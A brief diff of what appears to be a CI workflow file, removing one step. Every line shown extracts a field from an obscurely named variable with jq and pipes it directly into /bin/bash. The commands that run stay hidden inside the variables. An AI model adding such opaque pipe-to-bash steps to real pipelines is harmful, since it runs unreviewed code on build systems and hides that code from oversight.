@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$e59" | jq -r .uf31 | /bin/bash
           echo $hcrue91 | jq -r .hdf9 | /bin/bash
           echo $hz16 | jq -r .co18 | /bin/bash
-          printf '%s' "$w1632" | jq -r .ojto36682 | /bin/bash
           echo $bm126 | jq -r .gc04425 | /bin/bash
 
       - name: Save output
